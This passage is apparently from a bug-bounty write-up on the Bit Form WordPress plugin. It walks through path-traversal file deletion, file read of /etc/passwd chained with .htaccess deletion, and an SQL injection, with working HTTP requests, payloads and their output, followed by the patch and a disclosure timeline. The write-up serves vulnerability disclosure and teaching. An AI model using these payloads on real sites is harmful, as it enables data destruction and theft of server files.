After clicking the button, it'll send AJAX action `bitforms_create_new_form` to create a new form. If the form created successfully, it returns the form ID in object `data` attribute `id`.

Now that we have a valid form, let's try to delete a test file:

```shell
root@9e2f4f189063:/var/www/html# echo -n 'test' > test.txt
root@9e2f4f189063:/var/www/html# chown www-data:www-data test.txt
root@9e2f4f189063:/var/www/html# ls -lah test.txt
-rw-r--r-- 1 www-data www-data 4 Aug 22 11:09 test.txt
```

```http
POST /wp-admin/admin-ajax.php?action=bitforms_bulk_delete_form_entries&_ajax_nonce=56951b1f2d HTTP/1.1
Host: localhost
Content-Type: text/plain;charset=UTF-8
Content-Length: 30
Cookie: wordpress_86a9106ae65537651a8e456835b316ab=wordpress%7C1724485955%7C3MuslQ6YljdYmnUlWZHpXwkZNaOrPk5joqULpXwVLYr%7C2ed64b58bd1e6545e080831efa73208d7cd7a7d7db74f82d917bf1d084221f56; wp-settings-time-1=1724314921; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=wordpress%7C1724485955%7C3MuslQ6YljdYmnUlWZHpXwkZNaOrPk5joqULpXwVLYr%7Cc3ff3cd5203d9aa8bd10333b517737a257f01a675a5701cfae83a2855c027d65; PHPSESSID=btmj60280414pvpn1970aan8n7

{"formID":"1","entries":["../../../../../../../../../../../../../var/www/html/test.txt"]}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240822192425.png)

```shell
root@9e2f4f189063:/var/www/html# ls -lah test.txt 
ls: cannot access 'test.txt': No such file or directory
```

Nice! It worked! Now let's move onto the next method!

#### Arbitrary File Deletion via Method `deleteBlukForm`

```php
  public function deleteBlukForm($Request, $post)
  {
    if (isset($Request['formID'])) {
      $formID = wp_unslash($Request['formID']);
    } else {
      $formID = wp_unslash($post->formID);
    }
    if (is_null($formID) || !is_array($formID)) {
      return new WP_Error('empty_form', __('Form id is empty.', 'bit-form'));
    }
    $cssPath = BITFORMS_CONTENT_DIR . DIRECTORY_SEPARATOR . 'form-styles' . DIRECTORY_SEPARATOR;
    foreach ($formID as $id) {
      unlink($cssPath . 'bitform-' . $id . '.css');
      if (file_exists($cssPath . 'bitform-layout-' . $id . '.css')) {
        unlink($cssPath . 'bitform-layout-' . $id . '.css');
      }
      if (file_exists($cssPath . 'bitform-' . $id . '-formid' . '.css')) {
        unlink($cssPath . 'bitform-' . $id . '-formid' . '.css');
      }
    }
    [...]
    $fileHandler = new FileHandler();
    foreach ($formID as $fId) {
      if (file_exists(BITFORMS_UPLOAD_DIR . DIRECTORY_SEPARATOR . $fId)) {
        $fileHandler->rmrf(BITFORMS_UPLOAD_DIR . DIRECTORY_SEPARATOR . $fId);
      }
      [...]
    }
    [...]
  }
```

In here, we have the source `formID`. After checking the `formID` must be an array, it'll **delete CSS files** using PHP built-in function `unlink` **and everything inside the `formID` directory**. 

Just like the previous one, this method is used by class `AdminAjax` method `deleteBlukForm`, which is also used by AJAX action `bitforms_bulk_delete_form`:

```php
class AdminAjax
{
  public function register()
  {
    [...]
    add_action('wp_ajax_bitforms_bulk_delete_form', [$this, 'deleteBlukForm']);
    [...]
  }
  [...]
  public function deleteBlukForm()
  {
    if (wp_verify_nonce(sanitize_text_field($_REQUEST['_ajax_nonce']), 'bitforms_save')) {
      $inputJSON = file_get_contents('php://input');
      $input = json_decode($inputJSON);
      $formHandler = FormHandler::getInstance();
      $status = $formHandler->admin->deleteBlukForm($_REQUEST, $input);
      [...]
    } else {
      [...]
    }
  }
```

However, this time, unlike the previous one, we don't need a valid `formID`, as it doesn't check the `formID` is belonged to a legit form.

Now, let's test it!

First, create a test file:

```shell
root@9e2f4f189063:/var/www/html# echo -n 'test' > test.txt
root@9e2f4f189063:/var/www/html# chown www-data:www-data test.txt
root@9e2f4f189063:/var/www/html# ls -lah test.txt 
-rw-r--r-- 1 www-data www-data 4 Aug 22 11:35 test.txt
```

Then, send the following POST request:

```http
POST /wp-admin/admin-ajax.php?action=bitforms_bulk_delete_form&_ajax_nonce=56951b1f2d HTTP/1.1
Host: localhost
Content-Type: text/plain;charset=UTF-8
Content-Length: 89
Cookie: wordpress_86a9106ae65537651a8e456835b316ab=wordpress%7C1724485955%7C3MuslQ6YljdYmnUlWZHpXwkZNaOrPk5joqULpXwVLYr%7C2ed64b58bd1e6545e080831efa73208d7cd7a7d7db74f82d917bf1d084221f56; wp-settings-time-1=1724314921; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=wordpress%7C1724485955%7C3MuslQ6YljdYmnUlWZHpXwkZNaOrPk5joqULpXwVLYr%7Cc3ff3cd5203d9aa8bd10333b517737a257f01a675a5701cfae83a2855c027d65; PHPSESSID=btmj60280414pvpn1970aan8n7

{"formID":["../../../../../../../../../../../../../var/www/html/test.txt"]}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240822193710.png)

```shell
root@9e2f4f189063:/var/www/html# ls -lah test.txt 
ls: cannot access 'test.txt': No such file or directory
```

Nice! It's gone!

#### Arbitrary File Deletion via Method `deleteAForm`

Next up, the final method of this arbitrary file deletion, `deleteAForm`:

```php
  public function deleteAForm($Request, $post)
  {
    if (isset($Request['id'])) {
      $formID = wp_unslash($Request['id']);
    } else {
      $formID = wp_unslash($post->id);
    }
    [...]
    $fileHandler = new FileHandler();
    if (file_exists(BITFORMS_UPLOAD_DIR . DIRECTORY_SEPARATOR . $formID)) {
      $fileHandler->rmrf(BITFORMS_UPLOAD_DIR . DIRECTORY_SEPARATOR . $formID);
    }
    if (file_exists(BITFORMS_UPLOAD_DIR . DIRECTORY_SEPARATOR . $formID)) {
      $fileHandler->rmrf(BITFORMS_UPLOAD_DIR . DIRECTORY_SEPARATOR . $formID);
    }
    if (file_exists(BITFORMS_CONTENT_DIR . DIRECTORY_SEPARATOR . 'form-styles' . DIRECTORY_SEPARATOR . 'bitform-' . $formID . '.css')) {
      unlink(BITFORMS_CONTENT_DIR . DIRECTORY_SEPARATOR . 'form-styles' . DIRECTORY_SEPARATOR . 'bitform-' . $formID . '.css');
    }
    if (file_exists(BITFORMS_CONTENT_DIR . DIRECTORY_SEPARATOR . 'form-styles' . DIRECTORY_SEPARATOR . 'bitform-layout-' . $formID . '.css')) {
      unlink(BITFORMS_CONTENT_DIR . DIRECTORY_SEPARATOR . 'form-styles' . DIRECTORY_SEPARATOR . 'bitform-layout-' . $formID . '.css');
    }
    if (file_exists(BITFORMS_CONTENT_DIR . DIRECTORY_SEPARATOR . 'form-styles' . DIRECTORY_SEPARATOR . 'bitform-custom-' . $formID . '.css')) {
      unlink(BITFORMS_CONTENT_DIR . DIRECTORY_SEPARATOR . 'form-styles' . DIRECTORY_SEPARATOR . 'bitform-custom-' . $formID . '.css');
    }
    if (file_exists(BITFORMS_CONTENT_DIR . DIRECTORY_SEPARATOR . 'form-scripts' . DIRECTORY_SEPARATOR . 'bitform-custom-' . $formID . '.js')) {
      unlink(BITFORMS_CONTENT_DIR . DIRECTORY_SEPARATOR . 'form-scripts' . DIRECTORY_SEPARATOR . 'bitform-custom-' . $formID . '.js');
    }
    if (file_exists(BITFORMS_CONTENT_DIR . DIRECTORY_SEPARATOR . 'form-styles' . DIRECTORY_SEPARATOR . 'bitform-conversational-' . $formID . '.css')) {
      unlink(BITFORMS_CONTENT_DIR . DIRECTORY_SEPARATOR . 'form-styles' . DIRECTORY_SEPARATOR . 'bitform-conversational-' . $formID . '.css');
    }
    [...]
  }
```

Which is used by class `AdminAjax` method `deleteAForm` and AJAX action `bitforms_delete_aform`:

```php
class AdminAjax
{
  public function register()
  {
    [...]
    add_action('wp_ajax_bitforms_delete_aform', [$this, 'deleteAForm']);
    [...]
  }
  [...]
  public function deleteAForm()
  {
    if (wp_verify_nonce(sanitize_text_field($_REQUEST['_ajax_nonce']), 'bitforms_save')) {
      $inputJSON = file_get_contents('php://input');
      $input = json_decode($inputJSON);
      $formHandler = FormHandler::getInstance();
      $status = $formHandler->admin->deleteAForm($_REQUEST, $input);
      [...]
    } else {
      [...]
    }
  }
```

Again, we can delete any files in the file system using the source `formID`, as there's no sanitization in the `formID` whatsoever.

Let's test this file deletion vulnerability one last time!

Create a test file:

```shell
root@9e2f4f189063:/var/www/html# echo -n 'test' > test.txt
root@9e2f4f189063:/var/www/html# chown www-data:www-data test.txt
root@9e2f4f189063:/var/www/html# ls -lah test.txt 
-rw-r--r-- 1 www-data www-data 4 Aug 22 11:43 test.txt
```

Send the following POST request:

```http
POST /wp-admin/admin-ajax.php?action=bitforms_delete_aform&_ajax_nonce=56951b1f2d HTTP/1.1
Host: localhost
Content-Type: text/plain;charset=UTF-8
Content-Length: 75
Cookie: wordpress_86a9106ae65537651a8e456835b316ab=wordpress%7C1724485955%7C3MuslQ6YljdYmnUlWZHpXwkZNaOrPk5joqULpXwVLYr%7C2ed64b58bd1e6545e080831efa73208d7cd7a7d7db74f82d917bf1d084221f56; wp-settings-time-1=1724314921; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=wordpress%7C1724485955%7C3MuslQ6YljdYmnUlWZHpXwkZNaOrPk5joqULpXwVLYr%7Cc3ff3cd5203d9aa8bd10333b517737a257f01a675a5701cfae83a2855c027d65; PHPSESSID=btmj60280414pvpn1970aan8n7

{"id":"../../../../../../../../../../../../../var/www/html/test.txt"}
```

> Note: This time the parameter is `id` instead of `formID`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240822194546.png)

```shell
root@9e2f4f189063:/var/www/html# ls -lah test.txt 
ls: cannot access 'test.txt': No such file or directory
```

Let's go!

### Arbitrary File Read

Alrighty! Let's find arbitrary file read sinks! After some searching, we can find a sink in class `FileHandler` method `cpyr`:

```php
final class FileHandler
{
  [...]
  public function cpyr($source, $destination)
  {
    if (is_dir($source)) {
      mkdir($destination);
      // chmod($destination, 0744);
      $objects = scandir($source);
      foreach ($objects as $object) {
        if ('.' !== $object && '..' !== $object) {
          if (is_dir($source . DIRECTORY_SEPARATOR . $object) && !is_link($source . DIRECTORY_SEPARATOR . $object)) {
            cpyr($source . DIRECTORY_SEPARATOR . $object, $destination . DIRECTORY_SEPARATOR . $object);
          } elseif (is_file($source . DIRECTORY_SEPARATOR . $object)) {
            copy($source . DIRECTORY_SEPARATOR . $object, $destination . DIRECTORY_SEPARATOR . $object);
            // chmod($destination. DIRECTORY_SEPARATOR .$object, 0644);
          } else {
            symlink($source . DIRECTORY_SEPARATOR . $object, $destination . DIRECTORY_SEPARATOR . $object);
          }
        }
      }
    } else {
      copy($source, $destination);
    }
  }
```

As the method name suggested, it's similar to Linux's `cp -yr` command, which copies files recursively.

Again, find out where does this method is being used. Eventually, we'll find only one method uses it, which is `duplicateFormEntry` from class `AdminFormHandler`.

First, it validates the source `formID` and `entries` is an array. Then it checks the `formID` is belonged to a legit form:

```php
class AdminFormHandler
{
  [...]
  public function duplicateFormEntry($Request, $post)
  {
    if (isset($Request['formID'])) {
      $formID = wp_unslash($Request['formID']);
      $entries = wp_unslash($Request['entries']);
    } else {
      $formID = wp_unslash($post->formID);
      $entries = wp_unslash($post->entries);
    }
    if (is_null($formID) || !is_array($entries) || empty($entries)) {
      return new WP_Error('empty_form', __('Form id or entries id is invalid', 'bit-form'));
    }

    $formManager = new AdminFormManager($formID);
    if (!$formManager->isExist()) {
      return new WP_Error('empty_form', __('Form does not exist', 'bit-form'));
    }
    [...]
```

After that, it'll duplicate the form's submission entries and their [metadata](https://developer.wordpress.org/plugins/metadata/) via the database:

```php
class AdminFormHandler
{
  [...]
  public function duplicateFormEntry($Request, $post)
  {
    [...]
    $fileHandler = new FileHandler();
    $result = [];
    foreach ($entries as $entryIndex => $entryID) {
      $duplicatedEntryId = $formEntryModel->insert(
        [
          'form_id'     => $formID,
          'user_id'     => $user_details['id'],
          'user_ip'     => $user_details['ip'],
          'user_device' => $user_details['device'],
          'referer'     => 'duplicate of #' . $entryID,
          'status'      => 1,
          'created_at'  => $user_details['time'],
        ]
      );
      if ($duplicatedEntryId) {
        $duplicate_status = $entryMeta->duplicateEntryMeta(
          [
            'duplicateID' => $duplicatedEntryId,
            'entryID'     => $entryID,
          ]
        );
        if ($duplicate_status) {
          $result['details'][$entryID] = $duplicatedEntryId;
          $duplicate_count = $duplicate_count + 1;
          if (file_exists(BITFORMS_UPLOAD_DIR . "/$formID/$entryID")) {
            $fileHandler->cpyr(
              BITFORMS_UPLOAD_DIR . "/$formID/$entryID",
              BITFORMS_UPLOAD_DIR . "/$formID/$duplicatedEntryId"
            );
          }
        }
      }
    }
    [...]
```

Next, after successfully duplicating the entry, it'll copy every files inside that form's entry ID directory to `BITFORMS_UPLOAD_DIR . "/$formID/$duplicatedEntryId`:

```php
class AdminFormHandler
{
  [...]
  public function duplicateFormEntry($Request, $post)
  {
    [...]
    $fileHandler = new FileHandler();
    $result = [];
    foreach ($entries as $entryIndex => $entryID) {
      [...]
      if ($duplicatedEntryId) {
        [...]
        if ($duplicate_status) {
          [...]
          if (file_exists(BITFORMS_UPLOAD_DIR . "/$formID/$entryID")) {
            $fileHandler->cpyr(
              BITFORMS_UPLOAD_DIR . "/$formID/$entryID",
              BITFORMS_UPLOAD_DIR . "/$formID/$duplicatedEntryId"
            );
          }
        }
      }
    }
    [...]
```

Finally, after copying all the files, it'll return the `$duplicatedEntryId`:

```php
class AdminFormHandler
{
  [...]
  public function duplicateFormEntry($Request, $post)
  {
    [...]
    $count = $formEntryModel->count(
      [
        'form_id' => $formID,
      ]
    );
    $formManager->resetSubmissionCount(intval($count[0]->count));
    $result['message'] = 1 === count($entries) ? __('Entry Duplicated successfully', 'bit-form') : __('Entries Duplicated successfully', 'bit-form');
    return ($total_entries === $duplicate_count) ? $result : false;
```

Hmm... What's that `BITFORMS_UPLOAD_DIR` constant value? If we search for that, we'll find this at `/wp-content/plugins/bit-form/includes/loader.php`:

```php
$uploadDirInfo = wp_upload_dir();
$wpUploadbaseDir = $uploadDirInfo['basedir'];
[...]
$bitformsUploadBaseDir = $wpUploadbaseDir . DIRECTORY_SEPARATOR . 'bitforms';
[...]
define('BITFORMS_UPLOAD_DIR', $bitformsUploadBaseDir . DIRECTORY_SEPARATOR . 'uploads');
```

With that said, constant `BITFORMS_UPLOAD_DIR`'s value is `/var/www/html/wp-content/uploads/bitforms/uploads`.

Now, in this case, we can use path traversal payload in our source `entries` to **copy any files into directory `/var/www/html/wp-content/uploads/bitforms/uploads/<formID>/<duplicatedEntryId>`**, and then we can read that copied file!

Let's figure out how this method is being used! Indeed, just like the previous one, this method is called from class `AdminAjax` method `duplicateFormEntry`, which is used by AJAX action `bitforms_duplicate_form_entries`:

```php
class AdminAjax
{
  public function register()
  {
    [...]
    add_action('wp_ajax_bitforms_duplicate_form_entries', [$this, 'duplicateFormEntry']);
    [...]
  }
  public function duplicateFormEntry()
  {
    if (wp_verify_nonce(sanitize_text_field($_REQUEST['_ajax_nonce']), 'bitforms_save')) {
      $inputJSON = file_get_contents('php://input');
      $input = json_decode($inputJSON);
      $formHandler = FormHandler::getInstance();
      $status = $formHandler->admin->duplicateFormEntry($_REQUEST, $input);
      [...]
    } else {
      [...]
    }
  }
```

Let's try this!

Since we already created a new form during testing the arbitrary file deletion in method `deleteBlukFormEntries`, we'll just send the following POST request:

```http
POST /wp-admin/admin-ajax.php?action=bitforms_duplicate_form_entries&_ajax_nonce=56951b1f2d HTTP/1.1
Host: localhost
Content-Type: text/plain;charset=UTF-8
Content-Length: 94
Cookie: wordpress_86a9106ae65537651a8e456835b316ab=wordpress%7C1724485955%7C3MuslQ6YljdYmnUlWZHpXwkZNaOrPk5joqULpXwVLYr%7C2ed64b58bd1e6545e080831efa73208d7cd7a7d7db74f82d917bf1d084221f56; wp-settings-time-1=1724314921; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=wordpress%7C1724485955%7C3MuslQ6YljdYmnUlWZHpXwkZNaOrPk5joqULpXwVLYr%7Cc3ff3cd5203d9aa8bd10333b517737a257f01a675a5701cfae83a2855c027d65; PHPSESSID=btmj60280414pvpn1970aan8n7

{"formID":"1","entries":["../../../../../../../../../../../../../etc/passwd"]}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240822202928.png)

```shell
root@9e2f4f189063:/var/www/html# ls -lah wp-content/uploads/bitforms/uploads/1/
total 12K
drwxr-xr-x 2 www-data www-data 4.0K Aug 22 12:29 .
drwxr-xr-x 3 www-data www-data 4.0K Aug 22 11:59 ..
-rw-r--r-- 1 www-data www-data  922 Aug 22 12:29 1
root@9e2f4f189063:/var/www/html# head wp-content/uploads/bitforms/uploads/1/1
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
```

Nice! Can we read this copied file?

```shell
┌[siunam♥Mercury]-(~/bug-bounty/Wordfence/PoC/bit-form/file-read-deletion)-[2024.08.22|20:30:41(HKT)]
└> curl http://localhost/wp-content/uploads/bitforms/uploads/1/1
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at localhost Port 80</address>
</body></html>
```

Huh? It returns HTTP status code "403 Forbidden". Since I'm using Apache HTTP server, maybe there's a [`.htaccess` file](https://httpd.apache.org/docs/trunk/howto/htaccess.html) to restrict users being accessing that directory's files?

If we list all the hidden files at directory `/var/www/html/wp-content/uploads/bitforms/uploads/`, there's a `.htaccess` file:

```shell
root@9e2f4f189063:/var/www/html# ls -lah wp-content/uploads/bitforms/uploads/
total 20K
drwxr-xr-x 3 www-data www-data 4.0K Aug 22 11:59 .
drwxr-xr-x 5 www-data www-data 4.0K Aug 22 08:52 ..
-rw-r--r-- 1 www-data www-data  220 Aug 22 08:21 .htaccess
drwxr-xr-x 2 www-data www-data 4.0K Aug 22 12:29 1
-rw-r--r-- 1 www-data www-data    6 Aug 22 08:21 index.php
```

Let's take a look at that file:

```
<IfDefine php_flag>
    php_flag engine off
</IfDefine>
Options -Indexes
Order allow,deny
Deny from all
Require all denied
```

In here, we can see that it uses [Apache's access control](https://httpd.apache.org/docs/2.4/howto/access.html) to deny all requests to everything in directory `/var/www/html/wp-content/uploads/bitforms/uploads/`.

Hmm... Can we bypass that?

#### Arbitrary File Read Bypass via Arbitrary File Deletion

Ah ha! We can **chain with the arbitrary file deletion vulnerability** to delete that `.htaccess` file, and then we can read the copied file!

Let's delete that file!!

```http
POST /wp-admin/admin-ajax.php?action=bitforms_delete_aform&_ajax_nonce=56951b1f2d HTTP/1.1
Host: localhost
Content-Type: text/plain;charset=UTF-8
Content-Length: 106
Cookie: wordpress_86a9106ae65537651a8e456835b316ab=wordpress%7C1724485955%7C3MuslQ6YljdYmnUlWZHpXwkZNaOrPk5joqULpXwVLYr%7C2ed64b58bd1e6545e080831efa73208d7cd7a7d7db74f82d917bf1d084221f56; wp-settings-time-1=1724314921; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=wordpress%7C1724485955%7C3MuslQ6YljdYmnUlWZHpXwkZNaOrPk5joqULpXwVLYr%7Cc3ff3cd5203d9aa8bd10333b517737a257f01a675a5701cfae83a2855c027d65; PHPSESSID=btmj60280414pvpn1970aan8n7

{"id":"../../../../../../../../../../../../../var/www/html/wp-content/uploads/bitforms/uploads/.htaccess"}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240822204337.png)

```shell
┌[siunam♥Mercury]-(~/bug-bounty/Wordfence/PoC/bit-form/file-read-deletion)-[2024.08.22|20:43:00(HKT)]
└> curl http://localhost/wp-content/uploads/bitforms/uploads/1/1
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
[...]
```

Let's go!!!

### The Patch

To fix all 3 arbitrary file deletion and 1 arbitrary file read, it can be done by **validating the `id`, `formID`, and `entries` array's item to be an integer**.

In version 2.13.10, we can see one of the examples from the [revision log](https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=3136079%40bit-form%2Ftrunk&old=3133646%40bit-form%2Ftrunk&sfp_email=&sfph_mail=):

```php
class AdminFormHandler
{
  [...]
  public function deleteAForm($Request, $post)
  {
    if (isset($Request['id'])) {
      $formID = wp_unslash($Request['id']);
    } else {
      $formID = wp_unslash($post->id);
    }
    [...]
    if (!filter_var($formID, FILTER_VALIDATE_INT)) {
      return new WP_Error('invalid_form', __('Form id is invalid.', 'bit-form'));
    }
    [...]
  }
```

### Timeline

- Reported the vulnerabilities to Wordfence in July 5th, 2024 at 1:47 PM (UTC+8)
- Wordfence started the triage process in August 7th, 2024 at 10:07 PM (UTC+8)
- Wordfence assigned CVE ID "CVE-2024-7782" in August 13th, 2024 at 5:52 AM (UTC+8)
- Bit Form version 2.13.10 was released in August 15th, 2024
- Wordfence publicly disclosed the vulnerability in August 19th, 2024 at 11:14 PM (UTC+8)

## Authenticated (Administrator+) SQL Injection (CVE-2024-7780)

After finding all possible arbitrary file read/upload/deletion sinks, I decided to find SQL injection sinks. On WordPress, the sink typically is variable `$wpdb` and without any method `prepare` to prepare the SQL statement.

I then quickly found a SQL injection sink, which is from class `Model` method `execute`:

```php
class Model
{
  public function __construct()
  {
    global $wpdb;
    $this->app_db = $wpdb;
    $this->table_name = $wpdb->prefix . static::$table;
  }
  [...]
  protected function execute($sql, $values = null)
  {
    if (is_null($values)) {
      $preparedQuery = $sql;
    } else {
      $preparedQuery = $this->app_db->prepare($sql, $values);
    }
    // echo " Q S " . $preparedQuery . " Q  EE";
    if (empty($preparedQuery)) {
      $this->db_response = new WP_Error('null_query', __('prepared query is empty', 'bit-form'));
    } else {
      $this->db_response = false !== stripos($preparedQuery, 'DELETE') ? $this->app_db->query($preparedQuery)
          : $this->app_db->get_results($preparedQuery, OBJECT_K);
    }
    // print_r($this->app_db->last_query);
    return $this;
  }
```

As you can see, this class `Model` is actually a SQL query builder, quite complex to be honest. A SQL query builder like this typically has tons of methods to aid the developer to construct different SQL queries **without writing raw SQL queries**. However, if the builder **misused** or **implemented badly**, SQL injection vulnerabilities will still emerge.

In this `execute` method, we can see **it only prepares a given raw SQL query (`$sql`) IF the `$values` is not `null`**, then execute it and get the result of the raw SQL query.

Hmm... It is possible to **execute the unprepared raw SQL query**? Like, **what if the developer forgot to parse the `$values` to this method**?

Another similar pattern can be seen in method `duplicate` and `get`.

Let's take a closer look at method `get`:

```php
class Model
{
  [...]
  public function get($item = '*', $condition = [], $limit = null, $offset = null, $order_by = null, $order_follow = null)
  {
    [...]
    if (\is_array($item)) {
      $column_to_select = implode(',', $item);
    } else {
      $column_to_select = $item;
    }
    [...]
    if (empty($condition)) {
      $sql = "SELECT $column_to_select FROM `$this->table_name` $order $paginate";
      $all_values = null;
    } else {
      $formatted_conditions = $this->getFormatedCondition($condition);
      if ($formatted_conditions) {
        $condition_to_check = $formatted_conditions['conditions'];
        $all_values = $formatted_conditions['values'];
      } else {
        $condition_to_check = null;
        $all_values = null;
      }
      $sql = "SELECT $column_to_select FROM `$this->table_name`"
          . $condition_to_check . $order . $paginate;
    }
    return $this->execute($sql, $all_values)->getResult();
  }
```

In here, after building the `SELECT` clause, it parses the raw SQL query `$query` to the method `execute`. If there's no condition, the `WHERE` clause is not built, thus the raw SQL query looks like this:

```php
$sql = "SELECT $column_to_select FROM `$this->table_name` $order $paginate";
```

This method looks fine, but **what if the developer mistakenly parses the `$condition` to `$item`**, such as this:

```php
$condition = [ "id" => "evil_ID_here" ];
Model::get($condition);
```

Which builds the following SQL query:

```sql
SELECT evil_ID_here FROM `table_name_here`
```

Hmm... Let's find a misused method `get`. After searching, we can see there are 2 methods in class `EmailTemplateHandler` uses that method, which were method `getAllTemplate` and `duplicateTemplate`:

In `getAllTemplate`, it uses the method `get` correctly:

```php
final class EmailTemplateHandler
{
  [...]
  public function getAllTemplate($templateID = null, $userID = null)
  {
    $condition = [
      'form_id' => static::$_formID,
    ];
    if (!is_null($templateID)) {
      $condition = array_merge($condition, ['id' => $templateID]);
    }
    if (!is_null($userID)) {
      $condition = array_merge($condition, ['user_id' => $userID]);
    }
    return static::$_emailTemplateModel->get(
      [
        'id',
        'title',
        'sub',
        'body'
      ],
      $condition
    );
  }
```

**However, method `duplicateTemplate` is indeed misused the method `get`:**
```php
final class EmailTemplateHandler
{
  [...]
  public function duplicateTemplate($templateID)
  {
    $templateDetail = static::$_emailTemplateModel->get(
      [
        'id'      => $templateID,
        'form_id' => static::$_formID,
      ]
    );
    [...]
  }
```

As you can see, **both `$templateID` and `static::$_formID` are supposed to be in the `$condition` parameter**, `id` and `form_id` are supposed to be in the `$item` parameter!

Nice! **If we can somehow control `$templateID` or `static::$_formID`, it's jover**, we can exploit the SQL injection vulnerability.

By tracing back the execution flow, this method `duplicateTemplate` is used by class `AdminFormHandler`, which eventually used by class `AdminAjax` method `duplicateAMailTemplate` and AJAX action `bitforms_duplicate_mailtemplate`:

```php
class AdminFormHandler
{
  [...]
  public function duplicateAMailTemplate($Request, $post)
  {
    if (isset($Request['formID']) && $Request['id']) {
      $formID = json_decode(wp_unslash($Request['formID']));
      $id = wp_unslash($Request['id']);
    } else {
      $formID = wp_unslash($post->formID);
      $id = wp_unslash($post->id);
    }
    [...]
    $emailTemplateHandler = new EmailTemplateHandler($formID);
    $duplicate_status = $emailTemplateHandler->duplicateTemplate($id);
    [...]
  }
```

```php
class AdminAjax
{
  public function register()
  {
    [...]
    add_action('wp_ajax_bitforms_duplicate_mailtemplate', [$this, 'duplicateAMailTemplate']);
    [...]
  }
  [...]
  public function duplicateAMailTemplate()
  {
    if (wp_verify_nonce(sanitize_text_field($_REQUEST['_ajax_nonce']), 'bitforms_save')) {
      $inputJSON = file_get_contents('php://input');
      $input = json_decode($inputJSON);
      $formHandler = FormHandler::getInstance();
      $status = $formHandler->admin->duplicateAMailTemplate($_REQUEST, $input);
      [...]
    } else {
      [...]
    }
  }
```

To test this vulnerability more effectively, I'll use [Xdebug](https://xdebug.org/) and Visual Studio Code to debug it.

To do so, I'll set a breakpoint at class `EmailTemplateHandler` method `duplicateTemplate`'s first line, which calls method `get` in class `Model`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240822220536.png)

Then press F5 to start debugging.

After that, we can send the following POST request to trigger the breakpoint:

```http
POST /wp-admin/admin-ajax.php?action=bitforms_duplicate_mailtemplate&_ajax_nonce=56951b1f2d HTTP/1.1
Host: localhost
Content-Type: text/plain;charset=UTF-8
Content-Length: 23

{"formID":"1","id":"1"}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240822220700.png)

Next, we can click the "Step Into" button or press F11 to enter the code of the current line if it is a function call:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240822220731.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240822220943.png)

As you can see, variable `$condition` is an empty array, but variable `$item` has 2 array items!!

If we click the "Step Over" button or press F10 multiple times until the `return`, we can see that variable `$sql` is like this:

```sql
SELECT 1,1 FROM `wp_bitforms_email_template`
```

Nice! We can confirm that class `EmailTemplateHandler` method `duplicateTemplate` is indeed vulnerable to SQL injection!

Now, we can disable the breakpoint by unchecking the box:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240822221413.png)

And try the following MySQL error-based SQL injection payload:

```sql
updatexml(null,concat(0x0a,'MySQL version: ',version()),null)-- -
```

> Note 1: The payload is from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-error-based---updatexml-function)
>   
> Note 2: Both parameter `formID` and `id` are vulnerable to SQL injection

